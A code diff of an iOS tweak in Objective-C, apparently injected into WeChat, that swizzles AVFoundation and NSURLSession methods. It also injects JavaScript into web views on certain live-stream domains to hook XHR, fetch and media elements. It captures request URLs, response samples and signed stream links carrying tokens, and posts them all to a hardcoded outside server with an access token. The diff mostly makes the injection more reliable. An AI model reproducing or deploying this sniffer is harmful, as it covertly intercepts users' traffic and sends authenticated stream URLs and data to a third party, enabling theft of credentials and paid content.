@@ -1,6 +1,6 @@
-// ALIAllInOneSniffer.m
-// 一体化：JS 安全门控注入（仅目标域就绪后注入，抓啥都上报）+ 原生兜底（AVURLAsset/AVPlayerItem/NSURLSession）
-// 仅做被动观测；命中流地址会本地弹窗+复制，并把所有事件原样上报到你的服务器。
+// ALIAllInOneSniffer_Safe.m
+// 更稳的一体化：JS 安全门控注入 +（延迟）原生兜底（AV 仅开启，NSURLSession 默认关闭）
+// 仅做被动观测；命中流地址会本地弹窗+复制，所有事件原样上报到你的服务器。
 
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
@@ -8,20 +8,23 @@
 #import <AVFoundation/AVFoundation.h>
 #import <objc/runtime.h>
 
+#pragma mark - 开关
+
+static const BOOL AV_HOOK_ENABLED        = YES;  // 保守启用
+static const BOOL URLSESSION_HOOK_ENABLED= NO;   // 容易冲突，默认关闭（需要再改 YES）
+
 #pragma mark - 配置
 
 static NSString * const kPushHost  = @"http://139.155.57.242:8088";
 static NSString * const kPushToken = @"@Yy166431";
 static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }
 
-// JS 安全门控
 static const NSTimeInterval kScanInterval   = 1.2;   // 扫描 WKWebView 间隔
-static const NSTimeInterval kInjectDelay    = 0.6;   // 命中条件后延迟注入
+static const NSTimeInterval kInjectDelay    = 0.6;   // 满足条件后延迟注入
 static const NSTimeInterval kDedupeWindow   = 60.0;  // URL 去重窗口
 static const BOOL kShowPopupOnInject        = YES;   // 注入成功弹窗
 static const BOOL kShowPopupOnHit           = YES;   // 命中流地址弹窗+复制
 
-// 目标 host（命中才注入，可按需补充）
 static NSArray<NSString*> *TargetHosts(void) {
     return @[@"ukmdg.cn", @"vzuk.ukmdg.cn", @"wehfws.vzuk.ukmdg.cn", @"vzan.com", @"weizan.com"];
 }
@@ -39,6 +42,7 @@ static NSArray<NSString*> *TargetHosts(void) {
 
 static dispatch_queue_t gq;
 static NSMutableDictionary<NSString*, NSDate*> *g_seen;
+static BOOL g_avHooksInstalled = NO; // 仅在命中目标域后再装 AV hooks（更稳）
 
 static inline void on_main(void(^blk)(void)){
     if (!blk) return;
@@ -114,8 +118,7 @@ static void _ali_post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *b
     [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
     [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
     req.HTTPBody = body;
-    [[[NSURLSession sharedSession] dataTaskWithRequest:req
-                                     completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e) {
+    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e) {
         NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
         if (e || sc < 200 || sc >= 300) _ali_post_chain(paths, idx + 1, body);
     }] resume];
@@ -124,7 +127,6 @@ static void postText(NSString *text){
     if (!text) return;
     _ali_post_chain(kPushPaths(), 0, [text dataUsingEncoding:NSUTF8StringEncoding]);
 }
-
 static NSString *jsonStringify(NSDictionary *obj){
     if (!obj) return nil;
     NSData *d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
@@ -159,7 +161,7 @@ static void handleCapturedURL(NSString *url, NSString *from){
     NSString *s = jsonStringify(evt); if (s) postText(s);
 }
 
-#pragma mark - JS 注入部分（安全门控）
+#pragma mark - JS 注入（安全门控）
 
 static NSString *inpageJS(void){
     return @
@@ -171,7 +173,6 @@ static NSString *inpageJS(void){
         "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1)return true;"
         "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('pull.')!=-1||u.indexOf('replay')!=-1||u.indexOf('live')!=-1)return true;return false;}"
       "send('INJECT_OK',{});"
-      // XHR
       "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;if(XMLHttpRequest.prototype.__ali_patched__)return;XMLHttpRequest.prototype.__ali_patched__=true;"
         "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
         "XMLHttpRequest.prototype.send=function(b){try{var self=this,u=self.__ali_u||'',m=self.__ali_m||'';if(u){send('XHR_REQ',{from:'xhr',url:u,method:m});}"
@@ -180,7 +181,6 @@ static NSString *inpageJS(void){
             "send('XHR_RSP',{from:'xhr',url:u,method:m,status:st,ctype:ct,sample:sample});if(looks(u))send('HIT',{from:'xhr',url:u});}catch(e){}};"
           "this.addEventListener&&this.addEventListener('load',onload);}catch(e){}return S.apply(this,arguments)};"
       "})();"
-      // fetch
       "(function(){if(!window.fetch||window.fetch.__ali_patched__)return;var F=window.fetch;window.fetch.__ali_patched__=true;"
         "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u){send('FETCH_REQ',{from:'fetch',url:u,method:m});}"
           "return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0;var c=r.clone&&r.clone();"
@@ -188,11 +188,9 @@ static NSString *inpageJS(void){
               "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});});}"
             "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});}if(looks(u))send('HIT',{from:'fetch',url:u});}catch(e){}return r;});}"
         "catch(e){return F.apply(this,arguments)}})();"
-      // PerformanceObserver(resource)
       "(function(){if(!('PerformanceObserver'in window) || window.__ali_perf__)return;window.__ali_perf__=true;"
         "try{var seen=new Set();var ob=new PerformanceObserver(function(list){try{var arr=list.getEntries();for(var i=0;i<arr.length;i++){var e=arr[i];var u=e.name||'';if(!u||seen.has(u))continue;seen.add(u);send('RES',{from:'perf',url:u,initiator:e.initiatorType||''});if(looks(u))send('HIT',{from:'perf',url:u});}}catch(e){}});"
         "ob.observe({type:'resource',buffered:true});}catch(e){}})();"
-      // <video>/<audio>
       "(function(){if(window.__ali_media__)return;window.__ali_media__=true;"
         "function report(el,tag,ev){try{var s=el.currentSrc||el.src||((el.querySelector&&el.querySelector('source'))||{}).src||'';if(s){send('MEDIA',{from:tag+':'+ev,url:s});if(looks(s))send('HIT',{from:tag,url:s});}}catch(e){}}"
         "var obs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];"
@@ -202,7 +200,7 @@ static NSString *inpageJS(void){
         "var vs=document.querySelectorAll&&document.querySelectorAll('video,audio');for(var k=0;k<(vs?vs.length:0);k++){var t=vs[k].tagName.toLowerCase();report(vs[k],t,'init');vs[k].addEventListener&&vs[k].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} "
         "var setA=Element.prototype.setAttribute;if(!Element.prototype.__ali_setattr__){Element.prototype.__ali_setattr__=true;Element.prototype.setAttribute=function(k,v){try{if(this.tagName){var t=this.tagName.toLowerCase();if((t==='video'||t==='audio')&&k&&k.toLowerCase()==='src'){send('MEDIA_SET',{from:'setAttr',url:v});if(looks(v))send('HIT',{from:'setAttr',url:v});}}}catch(e){}return setA.apply(this,arguments)};}"
       "})();"
-      "console.log('[ALI_SNIF] injected (safe gate)');"
+      "console.log('[ALI_SNIF] injected (safe)');"
     "}catch(e){console.log('[ALI_SNIF] inject error',e)}})();";
 }
 
@@ -248,13 +246,19 @@ static void try_inject_when_ready(WKWebView *wv){
 
             objc_setAssociatedObject(wv, kInjectedKey, @(YES), OBJC_ASSOCIATION_RETAIN_NONATOMIC);
 
+            // 先移除重名 handler 再添加，避免重复注册崩溃（iOS 14+ 有 remove API）
+            @try{
+                if ([wv.configuration.userContentController respondsToSelector:@selector(removeScriptMessageHandlerForName:)]) {
+                    [wv.configuration.userContentController removeScriptMessageHandlerForName:@"__ALI_SNIF__"];
+                }
+            }@catch(__unused NSException *e){}
             if (!g_handler) g_handler = [ALIMessageHandler new];
             @try{ [wv.configuration.userContentController addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"]; }@catch(__unused NSException *e){}
 
             NSString *js = inpageJS();
             [wv evaluateJavaScript:js completionHandler:nil];
 
-            // PING 一下确认桥可用
+            // PING 确认桥可用
             NSString *ping = @"(function(){try{ if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){ window.webkit.messageHandlers.__ALI_SNIF__.postMessage({type:'PING_FROM_NATIVE', page:location.href, ts:Date.now()}); } }catch(e){} })();";
             [wv evaluateJavaScript:ping completionHandler:nil];
 
@@ -266,6 +270,18 @@ static void try_inject_when_ready(WKWebView *wv){
                                   @"page": (wv.URL.absoluteString ?: @""),
                                   @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
             NSString *s = jsonStringify(evt); if (s) postText(s);
+
+            // 命中目标域后，再安装 AV 原生兜底 hook（更稳）
+            if (AV_HOOK_ENABLED && !g_avHooksInstalled){
+                g_avHooksInstalled = YES;
+                dispatch_async(gq, ^{ // 放到串行队列里做
+                    @try{
+                        // 安装 AV hooks
+                        extern void _ali_install_av_hooks(void);
+                        _ali_install_av_hooks();
+                    }@catch(__unused NSException *e){}
+                });
+            }
         });
     }];
 }
@@ -324,27 +340,27 @@ static void scan_loop(void){
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval * NSEC_PER_SEC)), gq, ^{ scan_loop(); });
 }
 
-#pragma mark - 原生兜底（AV/NSURLSession）
+#pragma mark - 原生兜底（AV/NSURLSession，分级开关）
 
-// AVURLAsset: -initWithURL:options:
+// —— AVURLAsset
 static id (*orig_AVURLAsset_initWithURL_options)(id, SEL, NSURL *, NSDictionary *);
 static id replaced_AVURLAsset_initWithURL_options(id self, SEL _cmd, NSURL *URL, NSDictionary *options){
     @try{ if (URL.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(URL.absoluteString, @"AVURLAsset"); }); }@catch(__unused NSException *e){}
     return orig_AVURLAsset_initWithURL_options(self, _cmd, URL, options);
 }
-// AVPlayerItem: -initWithURL:
+// —— AVPlayerItem
 static id (*orig_AVPlayerItem_initWithURL)(id, SEL, NSURL *);
 static id replaced_AVPlayerItem_initWithURL(id self, SEL _cmd, NSURL *URL){
     @try{ if (URL.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(URL.absoluteString, @"AVPlayerItem"); }); }@catch(__unused NSException *e){}
     return orig_AVPlayerItem_initWithURL(self, _cmd, URL);
 }
-// NSURLSession: -dataTaskWithRequest:
+
+// —— NSURLSession（默认关闭）
 static NSURLSessionTask* (*orig_NSURLSession_dataTaskWithRequest)(id, SEL, NSURLRequest *);
 static NSURLSessionTask* replaced_NSURLSession_dataTaskWithRequest(id self, SEL _cmd, NSURLRequest *req){
     @try{ NSURL *u = req.URL; if (u.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(u.absoluteString, @"NSURLSession(Request)"); }); }@catch(__unused NSException *e){}
     return orig_NSURLSession_dataTaskWithRequest(self, _cmd, req);
 }
-// NSURLSession: -dataTaskWithURL:
 static NSURLSessionTask* (*orig_NSURLSession_dataTaskWithURL)(id, SEL, NSURL *);
 static NSURLSessionTask* replaced_NSURLSession_dataTaskWithURL(id self, SEL _cmd, NSURL *url){
     @try{ if (url.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(url.absoluteString, @"NSURLSession(URL)"); }); }@catch(__unused NSException *e){}
@@ -357,19 +373,25 @@ static void swizzle_instance_method(Class cls, SEL sel, IMP newImp, const char *
     method_setImplementation(m, newImp);
 }
 
-#pragma mark - 入口：两套机制一起启动
-
-__attribute__((constructor))
-static void ALIAllInOneSnifferInit(void){
-    if (!gq)    gq    = dispatch_queue_create("com.ali.allinone", DISPATCH_QUEUE_SERIAL);
-    if (!g_seen)g_seen= [NSMutableDictionary dictionary];
-
-    // 1) JS 安全门控扫描
-    scan_loop();
-
-    // 2) 原生兜底 swizzle
+static void _ali_install_urlsession_hooks(void){
+    if (!URLSESSION_HOOK_ENABLED) return;
     @try{
-        // AVURLAsset
+        Class cNSURLSession = NSClassFromString(@"NSURLSession");
+        if (!cNSURLSession) return;
+        SEL sel3 = @selector(dataTaskWithRequest:);
+        Method m3 = class_getInstanceMethod(cNSURLSession, sel3);
+        if (m3){ orig_NSURLSession_dataTaskWithRequest = (void*)method_getImplementation(m3);
+            swizzle_instance_method(cNSURLSession, sel3, (IMP)replaced_NSURLSession_dataTaskWithRequest, method_getTypeEncoding(m3)); }
+        SEL sel4 = @selector(dataTaskWithURL:);
+        Method m4 = class_getInstanceMethod(cNSURLSession, sel4);
+        if (m4){ orig_NSURLSession_dataTaskWithURL = (void*)method_getImplementation(m4);
+            swizzle_instance_method(cNSURLSession, sel4, (IMP)replaced_NSURLSession_dataTaskWithURL, method_getTypeEncoding(m4)); }
+    }@catch(__unused NSException *e){}
+}
+
+void _ali_install_av_hooks(void){
+    if (!AV_HOOK_ENABLED) return;
+    @try{
         Class cAVURLAsset = NSClassFromString(@"AVURLAsset");
         if (cAVURLAsset){
             SEL sel1 = @selector(initWithURL:options:);
@@ -377,7 +399,6 @@ static void ALIAllInOneSnifferInit(void){
             if (m1){ orig_AVURLAsset_initWithURL_options = (void*)method_getImplementation(m1);
                 swizzle_instance_method(cAVURLAsset, sel1, (IMP)replaced_AVURLAsset_initWithURL_options, method_getTypeEncoding(m1)); }
         }
-        // AVPlayerItem
         Class cAVPlayerItem = NSClassFromString(@"AVPlayerItem");
         if (cAVPlayerItem){
             SEL sel2 = @selector(initWithURL:);
@@ -385,23 +406,22 @@ static void ALIAllInOneSnifferInit(void){
             if (m2){ orig_AVPlayerItem_initWithURL = (void*)method_getImplementation(m2);
                 swizzle_instance_method(cAVPlayerItem, sel2, (IMP)replaced_AVPlayerItem_initWithURL, method_getTypeEncoding(m2)); }
         }
-        // NSURLSession
-        Class cNSURLSession = NSClassFromString(@"NSURLSession");
-        if (cNSURLSession){
-            SEL sel3 = @selector(dataTaskWithRequest:);
-            Method m3 = class_getInstanceMethod(cNSURLSession, sel3);
-            if (m3){ orig_NSURLSession_dataTaskWithRequest = (void*)method_getImplementation(m3);
-                swizzle_instance_method(cNSURLSession, sel3, (IMP)replaced_NSURLSession_dataTaskWithRequest, method_getTypeEncoding(m3)); }
-            SEL sel4 = @selector(dataTaskWithURL:);
-            Method m4 = class_getInstanceMethod(cNSURLSession, sel4);
-            if (m4){ orig_NSURLSession_dataTaskWithURL = (void*)method_getImplementation(m4);
-                swizzle_instance_method(cNSURLSession, sel4, (IMP)replaced_NSURLSession_dataTaskWithURL, method_getTypeEncoding(m4)); }
-        }
-
-        // 上报准备就绪
+        // 可选：URLSession hook（默认不开）
+        _ali_install_urlsession_hooks();
         NSDictionary *evt = @{@"type": @"NATIVE_HOOKS_READY",
                               @"app": @"WeChat",
                               @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
         NSString *s = jsonStringify(evt); if (s) postText(s);
     }@catch(__unused NSException *e){}
+}
+
+#pragma mark - 入口
+
+__attribute__((constructor))
+static void ALIAllInOneSnifferSafeInit(void){
+    if (!gq)    gq    = dispatch_queue_create("com.ali.allinone.safe", DISPATCH_QUEUE_SERIAL);
+    if (!g_seen)g_seen= [NSMutableDictionary dictionary];
+
+    // 启动：仅做 JS 扫描与门控；原生 AV hook 等命中目标域后再安装
+    scan_loop();
 }
